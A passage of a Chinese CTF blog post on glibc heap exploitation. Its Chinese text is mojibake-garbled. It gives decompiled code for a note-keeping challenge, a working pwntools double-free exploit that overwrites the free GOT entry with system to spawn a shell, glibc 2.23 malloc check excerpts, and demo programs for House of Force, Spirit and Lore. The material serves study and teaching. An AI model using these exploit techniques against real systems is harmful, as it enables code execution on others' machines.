<p>å‡½æ•° func1 ï¼Œ 16ä¸ªå•å…ƒï¼Œæ¯ä¸ªå•å…ƒä¸º16Bytesï¼Œå‰8Bytes ä¸ºnoteçš„åœ°å€ï¼Œå8Bytesä¸ºnoteå¤§å°ã€‚</p>
</blockquote>
<pre><code>void sub_40090A()
{
  signed int i; // [rsp+8h] [rbp-8h]
  int v1; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &lt;= 15; ++i )
  {
    if ( !qword_6010A0[2 * i] )
    {
      putchar(62);
      v1 = readnum();
      if ( v1 &gt; 0 &amp;&amp; v1 &lt;= 127 )
      {
        qword_6010A0[2 * i + 1] = (void *)v1;
        qword_6010A0[2 * i] = malloc(v1 + 1);
        putchar(62);
        read(0, qword_6010A0[2 * i], v1);
      }
      return;
    }
  }
}</code></pre><blockquote>
<p>å‡½æ•°2 ï¼Œåˆ é™¤ç•™è¨€ free</p>
</blockquote>
<pre><code>void f2()
{
  int v0; // [rsp+Ch] [rbp-4h]

  putchar(62);
  v0 = readnum();
  if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 15 )
    free(qword_6010A0[2 * v0]);
}</code></pre><blockquote>
<p>å‡½æ•°3 ,ä¿®æ”¹ç•™è¨€ã€‚</p>
</blockquote>
<pre><code class="signed">{
  signed int result; // eax
  signed int v1; // [rsp+Ch] [rbp-4h]

  putchar(62);
  result = readnum();
  v1 = result;
  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )
  {
    putchar(62);
    result = read(0, qword_6010A0[2 * v1], (size_t)qword_6010A0[2 * v1 + 1]);
  }
  return result;</code></pre>
<blockquote>
<p> åˆ©ç”¨æ€è·¯ï¼š</p>
<ol>
<li>Double Free å¾—åˆ° 0x6010A0 å†™æƒé™ã€‚</li>
<li>ä¸ºæ‰€æ¬²ä¸ºï¼Œæ³„æ¼gotï¼Œä¿®æ”¹ä¸ºsystemã€‚</li>
</ol>
</blockquote>
<p>åˆ©ç”¨è„šæœ¬å¦‚ä¸‹:</p>
<pre><code class="python">from pwn import *
p = process(&#39;./noinfoleak&#39;)
elf = ELF(&#39;./noinfoleak&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
free_got = elf.got[&#39;free&#39;]
read_got  = elf.got[&#39;read&#39;]
puts_plt = elf.symbols[&#39;puts&#39;]
read_base = libc.symbols[&#39;read&#39;]
sys_base = libc.symbols[&#39;system&#39;]

fake_chunk = 0x601085-8
target = 0x6010a0

def add(sz,cont):
    p.sendafter(&#39;&gt;&#39;,&#39;1&#39;)
    p.sendafter(&#39;&gt;&#39;,str(sz))
    p.sendafter(&#39;&gt;&#39;,cont)

def delete(idx):
    p.sendafter(&#39;&gt;&#39;,&#39;2&#39;)
    p.sendafter(&#39;&gt;&#39;,str(idx))

def edit(idx,cont):
    p.sendafter(&#39;&gt;&#39;,&#39;3&#39;)
    p.sendafter(&#39;&gt;&#39;,str(idx))
    p.sendafter(&#39;&gt;&#39;,cont)

add(100,&#39;1&#39;) #0
add(100,&#39;2&#39;) #1
add(30,&#39;top_chunk_defense&#39;) #2
delete(0)
delete(1)
delete(0)
add(100,p64(fake_chunk))#3
add(100,&#39;2&#39;)#4
add(100,&#39;1&#39;)#5
pay = &#39;a&#39;*(target-fake_chunk-16)+p64(free_got)+p64(100)+p64(read_got)+p64(100)
add(100,pay)#6
edit(0,p64(puts_plt))
delete(1)
read_real = u64(p.recv(6)+&#39;\x00\x00&#39;)
sys_real = read_real + sys_base-read_base
print hex(read_real)
edit(0,p64(sys_real))
edit(2,&#39;/bin/sh\x00&#39;)
delete(2)
p.interactive()</code></pre>
<h1 id="glibc-2-23-ä»£ç -Check"><a href="#glibc-2-23-ä»£ç -Check" class="headerlink" title="glibc-2.23 ä»£ç  Check"></a>glibc-2.23 ä»£ç  Check</h1><pre><code class="c">// malloc
// fastbin 
#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0))
      {
        errstr = &quot;malloc(): memory corruption (fast)&quot;;
      errout:
        malloc_printerr(check_action, errstr, chunk2mem(victim), av);
        return NULL;
      }
// smallbins
bck = victim-&gt;bk;
      if (__glibc_unlikely(bck-&gt;fd != victim))
        {
          errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
          goto errout;
        }
// process unsorted bin;
// victim is the top chunk of unsorted bin.
 if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))
        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,
                        chunk2mem(victim), av);
/* place unsorted bin&#39;s chunk in corresponding bin */

// split chunks into victim and remainder chunk.
// push remainder chunk into unsorted bin,there is a check;
bck = unsorted_chunks(av);
          fwd = bck-&gt;fd;
          if (__glibc_unlikely(fwd-&gt;bk != bck))
          {
            errstr = &quot;malloc(): corrupted unsorted chunks&quot;;
            goto errout;
          }</code></pre>
<pre><code class="c">// free
// general check, check chunk pointer and size;
// pinter &gt; (unsigned )-size or misaligned(pointer) ---&gt; printerr
 if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0))
  {
    errstr = &quot;free(): invalid pointer&quot;;
  errout:
    if (!have_lock &amp;&amp; locked)
      (void)mutex_unlock(&amp;av-&gt;mutex);
    malloc_printerr(check_action, errstr, chunk2mem(p), av);
    return;
  }
if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))
  {
    errstr = &quot;free(): invalid size&quot;;
    goto errout;
  }

//fastbin check:
//check the size of  victim&#39;s next chunk
if (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, 0))
    {
      if (have_lock || ({
            assert(locked == 0);
            mutex_lock(&amp;av-&gt;mutex);
            locked = 1;
            chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;
          }))
      {
        errstr = &quot;free(): invalid next size (fast)&quot;;
        goto errout;
      }
 //double free check (fastbin)
  if (__builtin_expect(old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
      }

  // check fastbin top size;
  if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0))
    {
      errstr = &quot;invalid fastbin entry (free)&quot;;
      goto errout;
    }

 /* checks before pushing the chunk into unsorted bin;*/

  // top check:
  if (__glibc_unlikely(p == av-&gt;top))
    {
      errstr = &quot;double free or corruption (top)&quot;;
      goto errout;
    }

  //
  if (__builtin_expect(contiguous(av) &amp;&amp; (char *)nextchunk &gt;= ((char *)av-&gt;top + chunksize(av-&gt;top)), 0))
    {
      errstr = &quot;double free or corruption (out)&quot;;
      goto errout;
    }
 // current chunk is in use.
  if (__glibc_unlikely(!prev_inuse(nextchunk)))
    {
      errstr = &quot;double free or corruption (!prev)&quot;;
      goto errout;
    }
  // nextchunk&#39;s size must be valid;
  nextsize = chunksize(nextchunk);
    if (__builtin_expect(nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0))
    {
      errstr = &quot;free(): invalid next size (normal)&quot;;
      goto errout;
    }

  // push chunk into unsorted chunk;
   bck = unsorted_chunks(av);
      fwd = bck-&gt;fd;
      if (__glibc_unlikely(fwd-&gt;bk != bck))
      {
        errstr = &quot;free(): corrupted unsorted chunks&quot;;
        goto errout;
      }
</code></pre>
<h1 id="malloc-c-æºç åˆ†æ"><a href="#malloc-c-æºç åˆ†æ" class="headerlink" title="malloc.c æºç åˆ†æ"></a>malloc.c æºç åˆ†æ</h1><blockquote>
<p>MALLOC_ALIGNMENT = 2*SIZE_SZ (64 : 8,32 : 4)</p>
<p>MIN_LAEGE_SIZE = 64*MALLOC_ALIGNMENT (64:0x400,32:0x200)</p>
<p>DEFAULT_MXFAST = 64 *SIZE_SZ /4 (64:0x80,32:0x40)</p>
</blockquote>
<pre><code class="c">struct malloc_chunk
{

  INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T size;      /* Size in bytes, including overhead. */

  struct malloc_chunk *fd; /* double links -- used only if free. */
  struct malloc_chunk *bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk *bk_nextsize;
};</code></pre>
<pre><code class="c">struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};</code></pre>
<h1 id="æ”»å‡»Demo"><a href="#æ”»å‡»Demo" class="headerlink" title="æ”»å‡»Demo"></a>æ”»å‡»Demo</h1><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><blockquote>
</blockquote>
<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
int main(){
    printf(&quot;Designed by primeleen\n&quot;);
    printf(&quot;Hello,this double free demo.\n&quot;);
    unsigned long long fake = 0x20;

    void *p1 = malloc(10);
    void *p2 = malloc(10);
    free(p1);free(p2); free(p1);

    unsigned long long *  tar = (unsigned long long *)malloc(10);
    *tar = (unsigned long long)((char*)&amp;fake-0x8);

    malloc(10);malloc(10);

    void *victim = malloc(10);
    printf(&quot;%p\n&quot;,victim);
    return 0;


}</code></pre>
<h3 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h3><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
char victim[20] = &quot;Prime is Here&quot;;
int main(){
  printf(&quot;%s\n&quot;,victim);
  void *p = malloc(0x10);
  void *top_chunk = p+0x20-0x10;
  *(long long *)(top_chunk+8) = -1;
  printf(&quot;%llx\n&quot;,*(long long *)(top_chunk+8));
  long long request_size = (char*)victim-(char*)top_chunk-0x10-8;
  printf(&quot;size:%llx\n&quot;,request_size);
  malloc(request_size);
  char *ptr = malloc(0x20);
  printf(&quot;Hacked! %s\n&quot;,ptr);
  return 0;
}</code></pre>
<h3 id="House-of-spirit-1"><a href="#House-of-spirit-1" class="headerlink" title="House of spirit"></a>House of spirit</h3><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(){
    long long * fake[20];
    malloc(0x30);
    fake[1] = fake[9] = (long long *)0x40;
    free((long long *)&amp;fake[2]);
    void *p = malloc(0x30);
    printf(&quot;%p&quot;,p);
    return 0;
}</code></pre>
<h3 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h3><pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
typedef unsigned long long ull;
typedef struct small_chunk{
    ull pre_size;
    ull size;
    struct small_chunk *fd;
    struct small_chunk *bk;
    char buf[0x100];
}small_chunk;

int main(){
    small_chunk fake,sub_fake;
    printf(&quot;fake_addr:%p\n&quot;,&amp;fake);
    void *ptr= malloc(0x100);
    small_chunk * victim;
    malloc(0x20);

    free(ptr);

    malloc(0x120);
    victim = (small_chunk*)(ptr-0x10);
    victim-&gt;bk = &amp;fake;
    fake.fd = victim;

    fake.bk = &amp;sub_fake;
    sub_fake.fd = &amp;fake;
    malloc(0x100);
    victim = malloc(0x100);
    printf(&quot;%p\n&quot;,victim);
    return 0;
}</code></pre>

      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚å¯ä»¥åœ¨ä¸‹é¢è¯„è®ºåŒºè¯„è®ºã€‚ </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">æ–‡ç« æ ‡é¢˜:</span>heap_details</p>
    
    <p><span class="copy-title">æœ¬æ–‡ä½œè€…:</span><a  title="æ«äº‘æ">æ«äº‘æ</a></p>
    <p><span class="copy-title">å‘å¸ƒæ—¶é—´:</span>2019-10-20, 00:00:00</p>
    <p><span class="copy-title">æœ€åæ›´æ–°:</span>2020-04-02, 01:02:33</p>
    <span class="copy-title">åŸå§‹é“¾æ¥:</span><a class="post-url" href="/2019/10/20/heap_details/" title="heap_details">https://primelyw.github.io/2019/10/20/heap_details/</a>
    <p>
        <span class="copy-title">ç‰ˆæƒå£°æ˜:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"ç½²å-éå•†ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0"</a> è½¬è½½è¯·ä¿ç•™åŸæ–‡é“¾æ¥åŠä½œè€…ã€‚
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">Â©2020 æ«äº‘æ</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">ç›®å½•</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*ä½œè€…ã€æ ‡ç­¾çš„è‡ªåŠ¨è¡¥å…¨*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#Pwn','#CTF','#CVE','#fuzz','#afl','#Defcon','#ruby','#lang',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("/img/article-list-bg.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
    .post .pjax article :not(pre) > code {
        color: #24292e;
        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
        background-color: rgba(27,31,35,.05);
        border-radius: 3px;
        font-size: 85%;
        margin: 0;
        padding: .2em .4em;
    }
    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
</div>


</html>
